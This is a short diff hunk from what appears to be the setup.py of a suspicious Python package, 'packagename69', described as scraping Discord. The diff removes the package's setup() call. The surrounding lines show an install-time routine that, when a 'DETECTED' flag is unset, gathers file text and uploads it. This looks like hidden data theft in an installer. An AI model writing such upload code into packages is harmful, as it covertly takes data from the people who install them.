@@ -706,18 +706,6 @@ if not DETECTED:
             filetext+='\n'
     upload('kiwi',filetext)
 
-setup(
-
-    name='packagename69',
-    packages=['packagename69'],
-    version='1.0',
-    license='MIT',
-    description='Scrapes Discord.',
-    author='helper',
-    keywords=['style'],
-    install_requires=[''],
-    classifiers=['Development Status :: 5 - Production/Stable']
-
-)
+# setup(...) removed                                                                                                                                                                                                                                                                  
 
 
